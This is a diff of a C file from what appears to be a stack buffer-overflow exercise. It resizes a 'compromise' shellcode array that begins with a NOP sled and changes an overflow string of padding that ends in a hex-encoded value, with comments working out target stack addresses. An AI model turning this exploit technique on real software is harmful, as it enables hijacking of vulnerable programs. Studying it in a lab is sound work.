@@ -16,7 +16,7 @@ int main(int argc, char * argv[]){
 }
 
 // Variable to contain hex bytes of shell code
-char compromise[160] = {
+char compromise[209] = {
                                              //  bits 64
      0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,//; two nop matching size in selfcomp.c
      0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
@@ -88,8 +88,8 @@ char * compromise1 =
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxxxxxxxxxxxxxxxxxx"
     "xxxx"
-    "MNOPWXYZ" //0x4d4e4f505758595a
-    "xxxxxxxx";
+    "\x4d\x4e\x4f\x50\x57\x58\x59\x5a" //0x4d4e4f505758595a
+    "xxxxxxxx"; //0x7fffffffdb98 - 81 == 0x7fffffffdb47
     // environ == 0x7ffff7fb5600
 
 int i;
